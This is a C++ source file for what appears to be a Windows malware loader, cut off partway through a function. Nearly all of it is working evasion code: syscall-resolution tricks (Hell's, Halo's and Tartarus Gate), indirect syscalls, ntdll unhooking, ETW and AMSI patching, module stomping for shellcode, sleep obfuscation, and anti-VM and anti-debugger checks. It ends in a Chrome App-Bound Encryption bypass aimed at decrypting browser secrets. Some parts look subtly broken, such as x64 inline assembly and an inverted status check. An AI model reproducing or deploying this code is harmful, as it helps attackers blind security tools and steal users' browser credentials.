#define _CRT_SECURE_NO_WARNINGS
#include <Windows.h>
#include <winternl.h>
#include <psapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <vector>
#include <string>
#include <random>
#include <chrono>
#include <thread>
#include <memory>
#include <functional>
#include <intrin.h>
#include <objbase.h>
#include <comdef.h>
#include <shlwapi.h>
#include <tlhelp32.h>
#include <processthreadsapi.h>
#include <timeapi.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleaut32.lib")

typedef LONG NTSTATUS;
typedef unsigned long long QWORD;
typedef uint32_t DWORD32;

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

#define CONFIG_ENABLE_HELLS_GATE 1
#define CONFIG_ENABLE_HALOS_GATE 1
#define CONFIG_ENABLE_TARTARUS_GATE 1
#define CONFIG_ENABLE_NULLGATE 1
#define CONFIG_ENABLE_HEAVENS_GATE 1
#define CONFIG_ENABLE_INDIRECT_SYSCALL 1
#define CONFIG_ENABLE_NTDLL_UNHOOKING 1
#define CONFIG_ENABLE_ETW_PATCHING 1
#define CONFIG_ENABLE_AMSI_BYPASS 1
#define CONFIG_ENABLE_MODULE_STOMPING 1
#define CONFIG_ENABLE_SLEEP_OBFUSCATION 1
#define CONFIG_ENABLE_CALLSTACK_SPOOFING 1
#define CONFIG_ENABLE_HWBP_CLEARING 1
#define CONFIG_ENABLE_ANTI_VM 1
#define CONFIG_ENABLE_CHROME_ABE_BYPASS 1

#define XOR_KEY 0xDEADBEEF
#define PAYLOAD_XOR_KEY 0xAA

extern "C" void IndirectSyscall5(DWORD ssn, ...);
extern "C" void IndirectSyscall6(DWORD ssn, ...);
extern "C" void HeavensGateEntry();
extern "C" void HeavensGateExit();

typedef struct _SYSCALL_ENTRY {
    DWORD ssn;
    PVOID address;
    char name[64];
} SYSCALL_ENTRY, * PSYSCALL_ENTRY;

typedef struct _NTDLL_GADGET {
    PVOID syscallAddr;
    PVOID retAddr;
} NTDLL_GADGET, * PNTDLL_GADGET;

static SYSCALL_ENTRY g_syscalls[256];
static DWORD g_syscallCount = 0;
static NTDLL_GADGET g_ntdllGadget = { 0 };
static HANDLE g_sleepEvent = NULL;
static bool g_unhooked = false;

extern "C" {
    NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
    NTSTATUS NtProtectVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect);
    NTSTATUS NtCreateThreadEx(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine, PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize, SIZE_T MaximumStackSize, PVOID AttributeList);
    NTSTATUS NtWriteVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten);
    NTSTATUS NtReadVirtualMemory(HANDLE ProcessHandle, PVOID BaseAddress, PVOID Buffer, SIZE_T NumberOfBytesToRead, PSIZE_T NumberOfBytesRead);
    NTSTATUS NtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId);
    NTSTATUS NtResumeThread(HANDLE ThreadHandle, PULONG SuspendCount);
    NTSTATUS NtSuspendThread(HANDLE ThreadHandle, PULONG SuspendCount);
    NTSTATUS NtQueryInformationProcess(HANDLE ProcessHandle, PROCESSINFOCLASS ProcessInformationClass, PVOID ProcessInformation, ULONG ProcessInformationLength, PULONG ReturnLength);
    NTSTATUS NtClose(HANDLE Handle);
    NTSTATUS NtGetContextThread(HANDLE ThreadHandle, PCONTEXT Context);
    NTSTATUS NtSetContextThread(HANDLE ThreadHandle, PCONTEXT Context);
    NTSTATUS NtQueueApcThread(HANDLE ThreadHandle, PIO_APC_ROUTINE ApcRoutine, PVOID ApcRoutineContext, PVOID ApcStatusBlock, PVOID ApcReserved);
    NTSTATUS NtWaitForSingleObject(HANDLE ObjectHandle, BOOLEAN Alertable, PLARGE_INTEGER Timeout);
}

static inline DWORD XorHash(const char* str, DWORD key) {
    DWORD hash = 0;
    while (*str) {
        hash = (hash * 33) ^ (*str++ ^ key);
    }
    return hash;
}

static inline void XorDecryptString(char* str, DWORD key) {
    size_t len = strlen(str);
    for (size_t i = 0; i < len; i++) {
        str[i] ^= (key >> ((i % 4) * 8)) & 0xFF;
    }
}

static inline void XorEncryptPayload(BYTE* data, SIZE_T size, BYTE key) {
    for (SIZE_T i = 0; i < size; i++) {
        data[i] ^= key;
    }
}

static inline bool IsBytePattern(PBYTE data, PBYTE pattern, SIZE_T len) {
    for (SIZE_T i = 0; i < len; i++) {
        if (data[i] != pattern[i]) return false;
    }
    return true;
}

static inline DWORD GetSyscallNumberFromStub(PBYTE stub) {
    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8) {
        return *(DWORD*)(stub + 4);
    }
    return 0xFFFFFFFF;
}

static inline bool IsSyscallStub(PBYTE addr) {
    return (addr[0] == 0x4C && addr[1] == 0x8B && addr[2] == 0xD1 && addr[3] == 0xB8);
}

static inline bool IsHooked(PBYTE addr) {
    return (addr[0] == 0xE9 || addr[0] == 0xEB || addr[0] == 0xFF);
}

static HMODULE GetNtdllBase() {
    return GetModuleHandleA("ntdll.dll");
}

static PVOID GetNtdllExport(HMODULE hNtdll, const char* name) {
    return GetProcAddress(hNtdll, name);
}

static DWORD64 FindSyscallNumberHellsGate(const char* functionName) {
    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) return 0xFFFFFFFF;

    PVOID pFunc = GetNtdllExport(hNtdll, functionName);
    if (!pFunc) return 0xFFFFFFFF;

    PBYTE pBytes = (PBYTE)pFunc;

    for (int i = 0; i < 64; i++) {
        if (IsSyscallStub(pBytes + i)) {
            return GetSyscallNumberFromStub(pBytes + i);
        }
    }

    return 0xFFFFFFFF;
}

static DWORD64 FindSyscallNumberHalosGate(const char* functionName) {
    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) return 0xFFFFFFFF;

    PVOID pFunc = GetNtdllExport(hNtdll, functionName);
    if (!pFunc) return 0xFFFFFFFF;

    PBYTE pBytes = (PBYTE)pFunc;

    if (IsSyscallStub(pBytes)) {
        return GetSyscallNumberFromStub(pBytes);
    }

    if (!IsHooked(pBytes)) {
        for (int i = 0; i < 64; i++) {
            if (IsSyscallStub(pBytes + i)) {
                return GetSyscallNumberFromStub(pBytes + i);
            }
        }
        return 0xFFFFFFFF;
    }

    int distance = 0;
    for (int i = 1; i < 4096; i++) {
        PBYTE p = pBytes - i;
        if (IsSyscallStub(p)) {
            if (!IsHooked(p)) {
                DWORD ssn = GetSyscallNumberFromStub(p);
                if (ssn != 0xFFFFFFFF) {
                    return ssn + distance;
                }
            }
            distance++;
        }
    }

    distance = 0;
    for (int i = 1; i < 4096; i++) {
        PBYTE p = pBytes + i;
        if (IsSyscallStub(p)) {
            if (!IsHooked(p)) {
                DWORD ssn = GetSyscallNumberFromStub(p);
                if (ssn != 0xFFFFFFFF) {
                    return ssn - distance;
                }
            }
            distance++;
        }
    }

    return 0xFFFFFFFF;
}

static DWORD64 FindSyscallNumberTartarusGate(const char* functionName) {
    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) return 0xFFFFFFFF;

    PVOID pFunc = GetNtdllExport(hNtdll, functionName);
    if (!pFunc) return 0xFFFFFFFF;

    PBYTE pBytes = (PBYTE)pFunc;

    if (IsSyscallStub(pBytes)) {
        return GetSyscallNumberFromStub(pBytes);
    }

    if (pBytes[0] == 0xE9 || pBytes[0] == 0xEB) {
        PBYTE pJmpTarget = NULL;
        if (pBytes[0] == 0xE9) {
            DWORD offset = *(DWORD*)(pBytes + 1);
            pJmpTarget = pBytes + 5 + offset;
        } else if (pBytes[0] == 0xEB) {
            pJmpTarget = pBytes + 2 + (signed char)pBytes[1];
        }

        if (pJmpTarget && IsSyscallStub(pJmpTarget)) {
            return GetSyscallNumberFromStub(pJmpTarget);
        }

        if (pJmpTarget && !IsHooked(pJmpTarget)) {
            for (int i = 0; i < 64; i++) {
                if (IsSyscallStub(pJmpTarget + i)) {
                    return GetSyscallNumberFromStub(pJmpTarget + i);
                }
            }
        }
    }

    if (pBytes[0] == 0xFF && pBytes[1] == 0x25) {
        PBYTE pAddr = *(PBYTE*)(pBytes + 2);
        if (pAddr && IsSyscallStub(pAddr)) {
            return GetSyscallNumberFromStub(pAddr);
        }
    }

    if (pBytes[0] == 0x48 && pBytes[1] == 0xB8) {
        PBYTE pAddr = *(PBYTE*)(pBytes + 2);
        if (pAddr) {
            for (int i = 0; i < 64; i++) {
                if (IsSyscallStub(pAddr + i)) {
                    return GetSyscallNumberFromStub(pAddr + i);
                }
            }
        }
    }

    return FindSyscallNumberHalosGate(functionName);
}

static bool ResolveSyscall(const char* name, PSYSCALL_ENTRY entry) {
    DWORD ssn = 0xFFFFFFFF;

#if CONFIG_ENABLE_TARTARUS_GATE
    ssn = FindSyscallNumberTartarusGate(name);
    if (ssn != 0xFFFFFFFF) {
        entry->ssn = ssn;
        entry->address = GetNtdllExport(GetNtdllBase(), name);
        strcpy(entry->name, name);
        return true;
    }
#endif

#if CONFIG_ENABLE_HALOS_GATE
    ssn = FindSyscallNumberHalosGate(name);
    if (ssn != 0xFFFFFFFF) {
        entry->ssn = ssn;
        entry->address = GetNtdllExport(GetNtdllBase(), name);
        strcpy(entry->name, name);
        return true;
    }
#endif

#if CONFIG_ENABLE_HELLS_GATE
    ssn = FindSyscallNumberHellsGate(name);
    if (ssn != 0xFFFFFFFF) {
        entry->ssn = ssn;
        entry->address = GetNtdllExport(GetNtdllBase(), name);
        strcpy(entry->name, name);
        return true;
    }
#endif

    return false;
}

static bool InitializeSyscalls() {
    const char* syscallNames[] = {
        "NtAllocateVirtualMemory",
        "NtProtectVirtualMemory",
        "NtCreateThreadEx",
        "NtWriteVirtualMemory",
        "NtReadVirtualMemory",
        "NtOpenProcess",
        "NtResumeThread",
        "NtSuspendThread",
        "NtQueryInformationProcess",
        "NtClose",
        "NtGetContextThread",
        "NtSetContextThread",
        "NtQueueApcThread",
        "NtWaitForSingleObject"
    };

    HMODULE hNtdll = GetNtdllBase();
    if (!hNtdll) return false;

    for (int i = 0; i < sizeof(syscallNames) / sizeof(const char*); i++) {
        if (ResolveSyscall(syscallNames[i], &g_syscalls[g_syscallCount])) {
            g_syscallCount++;
        }
    }

    PBYTE pNtdll = (PBYTE)hNtdll;
    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pNtdll;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(pNtdll + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            PBYTE textStart = pNtdll + pSection[i].VirtualAddress;
            DWORD textSize = pSection[i].Misc.VirtualSize;

            for (DWORD j = 0; j < textSize - 16; j++) {
                if (textStart[j] == 0x0F && textStart[j + 1] == 0x05 &&
                    textStart[j + 2] == 0xC3) {
                    g_ntdllGadget.syscallAddr = textStart + j;
                    g_ntdllGadget.retAddr = textStart + j + 3;
                    return true;
                }
            }
            break;
        }
    }

    return g_syscallCount > 0;
}

static SYSCALL_ENTRY* FindSyscallEntry(const char* name) {
    for (DWORD i = 0; i < g_syscallCount; i++) {
        if (strcmp(g_syscalls[i].name, name) == 0) {
            return &g_syscalls[i];
        }
    }
    return NULL;
}

static NTSTATUS NtAllocateVirtualMemorySyscall(HANDLE ProcessHandle, PVOID* BaseAddress,
    ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect) {
    SYSCALL_ENTRY* entry = FindSyscallEntry("NtAllocateVirtualMemory");
    if (!entry) return STATUS_UNSUCCESSFUL;

#if CONFIG_ENABLE_INDIRECT_SYSCALL
    NTSTATUS result;
    __asm {
        mov r10, rcx
        mov eax, entry->ssn
        mov r11, g_ntdllGadget.syscallAddr
        jmp r11
        mov result, eax
    }
    return result;
#else
    __asm {
        mov r10, rcx
        mov eax, entry->ssn
        syscall
        ret
    }
#endif
}

static NTSTATUS NtProtectVirtualMemorySyscall(HANDLE ProcessHandle, PVOID* BaseAddress,
    PSIZE_T RegionSize, ULONG NewProtect, PULONG OldProtect) {
    SYSCALL_ENTRY* entry = FindSyscallEntry("NtProtectVirtualMemory");
    if (!entry) return STATUS_UNSUCCESSFUL;

    NTSTATUS result;
    __asm {
        mov r10, rcx
        mov eax, entry->ssn
        mov r11, g_ntdllGadget.syscallAddr
        jmp r11
        mov result, eax
    }
    return result;
}

static NTSTATUS NtCreateThreadExSyscall(PHANDLE ThreadHandle, ACCESS_MASK DesiredAccess,
    POBJECT_ATTRIBUTES ObjectAttributes, HANDLE ProcessHandle, PVOID StartRoutine,
    PVOID Argument, ULONG CreateFlags, SIZE_T ZeroBits, SIZE_T StackSize,
    SIZE_T MaximumStackSize, PVOID AttributeList) {
    SYSCALL_ENTRY* entry = FindSyscallEntry("NtCreateThreadEx");
    if (!entry) return STATUS_UNSUCCESSFUL;

    NTSTATUS result;
    __asm {
        mov r10, rcx
        mov eax, entry->ssn
        mov r11, g_ntdllGadget.syscallAddr
        jmp r11
        mov result, eax
    }
    return result;
}

static NTSTATUS NtWriteVirtualMemorySyscall(HANDLE ProcessHandle, PVOID BaseAddress,
    PVOID Buffer, SIZE_T NumberOfBytesToWrite, PSIZE_T NumberOfBytesWritten) {
    SYSCALL_ENTRY* entry = FindSyscallEntry("NtWriteVirtualMemory");
    if (!entry) return STATUS_UNSUCCESSFUL;

    NTSTATUS result;
    __asm {
        mov r10, rcx
        mov eax, entry->ssn
        mov r11, g_ntdllGadget.syscallAddr
        jmp r11
        mov result, eax
    }
    return result;
}

static NTSTATUS NtResumeThreadSyscall(HANDLE ThreadHandle, PULONG SuspendCount) {
    SYSCALL_ENTRY* entry = FindSyscallEntry("NtResumeThread");
    if (!entry) return STATUS_UNSUCCESSFUL;

    NTSTATUS result;
    __asm {
        mov r10, rcx
        mov eax, entry->ssn
        mov r11, g_ntdllGadget.syscallAddr
        jmp r11
        mov result, eax
    }
    return result;
}

static NTSTATUS NtCloseSyscall(HANDLE Handle) {
    SYSCALL_ENTRY* entry = FindSyscallEntry("NtClose");
    if (!entry) return STATUS_UNSUCCESSFUL;

    NTSTATUS result;
    __asm {
        mov r10, rcx
        mov eax, entry->ssn
        mov r11, g_ntdllGadget.syscallAddr
        jmp r11
        mov result, eax
    }
    return result;
}

static bool UnhookNtdll() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return false;

    HANDLE hMapping = CreateFileMapping(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    if (!hMapping) {
        CloseHandle(hFile);
        return false;
    }

    PVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);
    if (!pCleanNtdll) {
        CloseHandle(hMapping);
        CloseHandle(hFile);
        return false;
    }

    PIMAGE_DOS_HEADER pDosHooked = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHooked = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDosHooked->e_lfanew);

    PIMAGE_DOS_HEADER pDosClean = (PIMAGE_DOS_HEADER)pCleanNtdll;
    PIMAGE_NT_HEADERS pNtClean = (PIMAGE_NT_HEADERS)((PBYTE)pCleanNtdll + pDosClean->e_lfanew);

    PIMAGE_SECTION_HEADER pSectionHooked = IMAGE_FIRST_SECTION(pNtHooked);
    PIMAGE_SECTION_HEADER pSectionClean = IMAGE_FIRST_SECTION(pNtClean);

    bool success = false;

    for (WORD i = 0; i < pNtHooked->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSectionHooked[i].Name, ".text") == 0) {
            PVOID targetAddr = (PBYTE)hNtdll + pSectionHooked[i].VirtualAddress;
            PVOID sourceAddr = (PBYTE)pCleanNtdll + pSectionClean[i].VirtualAddress;
            DWORD size = pSectionHooked[i].Misc.VirtualSize;

            DWORD oldProtect;
            if (VirtualProtect(targetAddr, size, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(targetAddr, sourceAddr, size);
                VirtualProtect(targetAddr, size, oldProtect, &oldProtect);
                success = true;
            }
            break;
        }
    }

    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    g_unhooked = success;
    return success;
}

static bool PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return false;

    PVOID pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    PVOID pEtwEventWriteFull = GetProcAddress(hNtdll, "EtwEventWriteFull");

    if (!pEtwEventWrite && !pEtwEventWriteFull) return false;

    DWORD oldProtect;

    if (pEtwEventWrite) {
        if (VirtualProtect(pEtwEventWrite, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            PBYTE p = (PBYTE)pEtwEventWrite;
            p[0] = 0xC3;
            p[1] = 0xCC;
            p[2] = 0xCC;
            p[3] = 0xCC;
            VirtualProtect(pEtwEventWrite, 8, oldProtect, &oldProtect);
        }
    }

    if (pEtwEventWriteFull) {
        if (VirtualProtect(pEtwEventWriteFull, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
            PBYTE p = (PBYTE)pEtwEventWriteFull;
            p[0] = 0xC3;
            p[1] = 0xCC;
            p[2] = 0xCC;
            p[3] = 0xCC;
            VirtualProtect(pEtwEventWriteFull, 8, oldProtect, &oldProtect);
        }
    }

    return true;
}

static bool PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) {
        hAmsi = GetModuleHandleA("amsi.dll");
        if (!hAmsi) return false;
    }

    PVOID pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;

    DWORD oldProtect;
    if (VirtualProtect(pAmsiScanBuffer, 8, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        PBYTE p = (PBYTE)pAmsiScanBuffer;
        p[0] = 0xB8;
        p[1] = 0x01;
        p[2] = 0x00;
        p[3] = 0x00;
        p[4] = 0x00;
        p[5] = 0xC3;
        VirtualProtect(pAmsiScanBuffer, 8, oldProtect, &oldProtect);
        return true;
    }

    return false;
}

static bool ModuleStomping(BYTE* shellcode, SIZE_T size) {
    HMODULE hModule = LoadLibraryA("winmm.dll");
    if (!hModule) return false;

    PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)hModule;
    PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)((PBYTE)hModule + pDos->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

    for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".text") == 0) {
            PVOID targetAddr = (PBYTE)hModule + pSection[i].VirtualAddress;
            DWORD sectionSize = pSection[i].Misc.VirtualSize;

            if (sectionSize < size) {
                sectionSize = (DWORD)size;
            }

            DWORD oldProtect;
            if (VirtualProtect(targetAddr, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                memcpy(targetAddr, shellcode, size);
                VirtualProtect(targetAddr, sectionSize, oldProtect, &oldProtect);
                return true;
            }
            break;
        }
    }

    return false;
}

static void SleepObfuscation(BYTE* data, SIZE_T size, DWORD milliseconds) {
    if (!data || size == 0) {
        Sleep(milliseconds);
        return;
    }

    BYTE* encrypted = (BYTE*)malloc(size);
    if (!encrypted) {
        Sleep(milliseconds);
        return;
    }

    memcpy(encrypted, data, size);
    XorEncryptPayload(encrypted, size, PAYLOAD_XOR_KEY);

    DWORD oldProtect;
    VirtualProtect(data, size, PAGE_READWRITE, &oldProtect);
    memcpy(data, encrypted, size);
    VirtualProtect(data, size, oldProtect, &oldProtect);

    free(encrypted);

    HANDLE hEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (hEvent) {
        WaitForSingleObject(hEvent, milliseconds);
        CloseHandle(hEvent);
    } else {
        Sleep(milliseconds);
    }

    VirtualProtect(data, size, PAGE_READWRITE, &oldProtect);
    XorEncryptPayload(data, size, PAYLOAD_XOR_KEY);
    VirtualProtect(data, size, oldProtect, &oldProtect);
}

static bool ClearHardwareBreakpoints() {
    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;

    HANDLE hThread = GetCurrentThread();
    if (!NtGetContextThread(hThread, &ctx)) {
        ctx.Dr0 = 0;
        ctx.Dr1 = 0;
        ctx.Dr2 = 0;
        ctx.Dr3 = 0;
        ctx.Dr7 = 0;
        return NtSetContextThread(hThread, &ctx);
    }

    return false;
}

static bool CheckHypervisorCPUID() {
    int cpuInfo[4] = { 0 };
    __cpuid(cpuInfo, 0x40000000);

    char hypervisor[13] = { 0 };
    memcpy(hypervisor, &cpuInfo[1], 4);
    memcpy(hypervisor + 4, &cpuInfo[2], 4);
    memcpy(hypervisor + 8, &cpuInfo[3], 4);

    const char* vmSignatures[] = {
        "VMwareVMware",
        "VBoxVBoxVBox",
        "Microsoft Hv",
        "KVMKVMKVM",
        "XenVMMXenVMM",
        "parallels"
    };

    for (int i = 0; i < sizeof(vmSignatures) / sizeof(const char*); i++) {
        if (strstr(hypervisor, vmSignatures[i])) {
            return true;
        }
    }

    return false;
}

static bool CheckVMProcesses() {
    const char* vmProcesses[] = {
        "vmtoolsd.exe",
        "VBoxService.exe",
        "VBoxTray.exe",
        "VMwareService.exe",
        "VMwareTray.exe",
        "xenservice.exe",
        "vmsrvc.exe"
    };

    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            for (int i = 0; i < sizeof(vmProcesses) / sizeof(const char*); i++) {
                if (_stricmp(pe.szExeFile, vmProcesses[i]) == 0) {
                    CloseHandle(hSnapshot);
                    return true;
                }
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return false;
}

static bool CheckVMRegistry() {
    const char* vmKeys[] = {
        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc",
        "SYSTEM\\CurrentControlSet\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName",
        "HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemManufacturer",
        "HARDWARE\\DESCRIPTION\\System\\BIOS\\SystemProductName"
    };

    const char* vmStrings[] = {
        "VMware",
        "VBOX",
        "VirtualBox",
        "QEMU",
        "Xen",
        "Microsoft Virtual",
        "Parallels"
    };

    for (int i = 0; i < sizeof(vmKeys) / sizeof(const char*); i++) {
        HKEY hKey;
        char value[256] = { 0 };
        DWORD size = sizeof(value);

        if (RegGetValueA(HKEY_LOCAL_MACHINE, vmKeys[i], NULL,
            RRF_RT_REG_SZ, NULL, value, &size) == ERROR_SUCCESS) {
            for (int j = 0; j < sizeof(vmStrings) / sizeof(const char*); j++) {
                if (strstr(value, vmStrings[j])) {
                    return true;
                }
            }
        }
    }

    return false;
}

static bool CheckTimingAnomaly() {
    const int iterations = 100;
    LARGE_INTEGER start, end, freq;
    QueryPerformanceFrequency(&freq);

    QueryPerformanceCounter(&start);

    for (int i = 0; i < iterations; i++) {
        __rdtsc();
        volatile int x = 0;
        for (int j = 0; j < 1000; j++) x += j;
    }

    QueryPerformanceCounter(&end);

    double elapsed = (double)(end.QuadPart - start.QuadPart) / freq.QuadPart;

    return elapsed > 0.5;
}

static bool CheckMACAddress() {
    ULONG outBufLen = 0;
    GetAdaptersInfo(NULL, &outBufLen);
    if (outBufLen == 0) return false;

    PIP_ADAPTER_INFO pAdapterInfo = (PIP_ADAPTER_INFO)malloc(outBufLen);
    if (!pAdapterInfo) return false;

    if (GetAdaptersInfo(pAdapterInfo, &outBufLen) != ERROR_SUCCESS) {
        free(pAdapterInfo);
        return false;
    }

    const char* vmMacPrefixes[] = {
        "00:05:69", "00:0C:29", "00:50:56", "00:1C:14",
        "00:15:5D", "00:03:FF", "00:1E:37", "00:0F:4B",
        "08:00:27", "52:54:00"
    };

    PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
    while (pAdapter) {
        char mac[18];
        sprintf(mac, "%02X:%02X:%02X:%02X:%02X:%02X",
            pAdapter->Address[0], pAdapter->Address[1],
            pAdapter->Address[2], pAdapter->Address[3],
            pAdapter->Address[4], pAdapter->Address[5]);

        for (int i = 0; i < sizeof(vmMacPrefixes) / sizeof(const char*); i++) {
            if (strncmp(mac, vmMacPrefixes[i], 8) == 0) {
                free(pAdapterInfo);
                return true;
            }
        }

        pAdapter = pAdapter->Next;
    }

    free(pAdapterInfo);
    return false;
}

static bool CheckDebuggerPresent() {
    if (IsDebuggerPresent()) return true;

    BOOL isDebugged = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);
    if (isDebugged) return true;

    HANDLE hProcess = GetCurrentProcess();
    PROCESS_BASIC_INFORMATION pbi = { 0 };
    ULONG returnLength = 0;

    NTSTATUS status = NtQueryInformationProcess(hProcess,
        ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength);

    if (NT_SUCCESS(status) && pbi.PebBaseAddress) {
        if (*(BYTE*)((PBYTE)pbi.PebBaseAddress + 2) & 0x2) {
            return true;
        }
    }

    DWORD64 ntdll = (DWORD64)GetModuleHandleA("ntdll.dll");
    if (ntdll) {
        PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)ntdll;
        PIMAGE_NT_HEADERS pNt = (PIMAGE_NT_HEADERS)(ntdll + pDos->e_lfanew);
        PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNt);

        for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
            if (strcmp((char*)pSection[i].Name, ".rdata") == 0) {
                DWORD64 offset = pSection[i].VirtualAddress;
                while (offset < pSection[i].VirtualAddress + pSection[i].Misc.VirtualSize) {
                    if (*(DWORD*)(ntdll + offset) == 0x00000000) {
                        offset += 4;
                        continue;
                    }
                    offset++;
                }
                break;
            }
        }
    }

    return false;
}

static bool PerformAntiVMChecks() {
#if CONFIG_ENABLE_ANTI_VM
    if (CheckHypervisorCPUID()) return false;
    if (CheckVMProcesses()) return false;
    if (CheckVMRegistry()) return false;
    if (CheckMACAddress()) return false;
    if (CheckTimingAnomaly()) return false;
    if (CheckDebuggerPresent()) return false;

    CONTEXT ctx = { 0 };
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    if (GetThreadContext(GetCurrentThread(), &ctx)) {
        if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) {
            return false;
        }
    }
#endif
    return true;
}

typedef HRESULT(WINAPI* IElevator_Decrypt)(PVOID, const wchar_t*, int, BYTE*, DWORD*);

static bool BypassChromeAppBoundEncryption() {
#if CONFIG_ENABLE_CHROME_ABE_BYPASS
    wchar_t chromePath[MAX_PATH];
    GetModuleFileNameW(NULL, chromePath, MAX_PATH);

    wchar_t chromeDir[MAX_PATH];
    wcscpy(chromeDir, chromePath);
    wchar_t* lastSlash = wcsrchr(chromeDir, L'\\');
    if (lastSlash) *lastSlash = L'\0';

    if (!PathFileExistsW(L"C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe") &&
        !PathFileExistsW(L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe")) {
        return false;
    }

    if (wcsstr(chromeDir, L"Google\\Chrome\\Application") == NULL) {
        wchar_t targetDir[MAX_PATH];
        wsprintfW(targetDir, L"C:\\Program Files\\Google\\Chrome\\Application\\%s", 
            wcsrchr(chromePath, L'\\') + 1);
        
        if (!CopyFileW(chromePath, targetDir, FALSE)) {
            wsprintfW(targetDir, L"C:\\Program Files (x86)\\Google\\Chrome\\Application\\%s",
                wcsrchr(chromePath, L'\\') + 1);
            if (!CopyFileW(chromePath, targetDir, FALSE)) {
                return false;
            }
        }
    }

    HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;

    CLSID clsid;
    IID iid;

    HRESULT result = CLSIDFromString(L"{708860E0-F641-4611-8895-7D867DD3675B}", &clsid);
    if (FAILED(result)) {
        CoUninitialize();
        return false;
    }

    result = IIDFromString(L"{463ABECF-410D-407F-8AF5-0DF35A005CC8}", &iid);
    if (FAILED(result)) {
        CoUninitialize();
        return false;
    }

    PVOID pElevator = NULL;
    hr = CoCreateInstance(clsid, NULL, CLSCTX_LOCAL_SERVER, iid, &pElevator);

    if (FAILED(hr) || !pElevator) {
